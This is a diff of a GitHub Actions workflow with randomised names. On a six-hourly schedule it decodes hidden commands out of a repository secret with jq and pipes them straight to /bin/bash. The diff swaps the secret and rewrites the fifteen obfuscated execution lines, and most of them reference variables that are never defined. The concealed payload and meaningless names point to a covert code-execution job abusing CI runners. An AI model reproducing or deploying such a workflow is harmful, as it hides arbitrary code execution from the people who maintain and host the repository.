@@ -1,9 +1,8 @@
 name: fengyuanchai4545
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 5/6 * * *'
+    - cron: '56 5/6 * * *'
 
 jobs:
   build:
@@ -13,18 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          uy3509: ${{ secrets.uy3509 }}
+          wnw79921: ${{ secrets.wnw79921 }}
         run: |
-          echo $uy3509 | jq -r .jl8 | /bin/bash
-          echo $iq2030 | jq -r .k84492 | /bin/bash
-          echo $yfm75651 | jq -r .y99843 | /bin/bash
-          echo $pitl3 | jq -r .by002 | /bin/bash
-          echo $sbsgx57831 | jq -r .ky365 | /bin/bash
-          echo $wj53 | jq -r .bsie981 | /bin/bash
-          echo $k32139 | jq -r .z01 | /bin/bash
-          echo $ixh390 | jq -r .zgb1 | /bin/bash
-          echo $iqqv68830 | jq -r .ppxu50764 | /bin/bash
-          echo $b9 | jq -r .mvfvh037 | /bin/bash
-          echo $bw19 | jq -r .s87387 | /bin/bash
-          echo $qc3 | jq -r .dfs2 | /bin/bash
+          echo $wnw79921 | jq -r .viw5786 | /bin/bash
+          echo $kks78 | jq -r .sic18 | /bin/bash
+          echo $rro0585 | jq -r .lbcml3614 | /bin/bash
+          echo $o05 | jq -r .uii90919 | /bin/bash
+          echo $fuy3602 | jq -r .vupog96132 | /bin/bash
+          echo $tyacn78159 | jq -r .nzsok836 | /bin/bash
+          echo $de250 | jq -r .ifsfb407 | /bin/bash
+          echo $blxib2 | jq -r .xyc5390 | /bin/bash
+          echo $a84 | jq -r .vh814 | /bin/bash
+          echo $erv53 | jq -r .flnt738 | /bin/bash
+          echo $jvhwm49 | jq -r .rk7 | /bin/bash
+          echo $lkd9 | jq -r .c3 | /bin/bash
+          echo $pwto90682 | jq -r .cb24443 | /bin/bash
+          echo $qrel040 | jq -r .ema4 | /bin/bash
+          echo $vrtmk22 | jq -r .hhune26 | /bin/bash
 
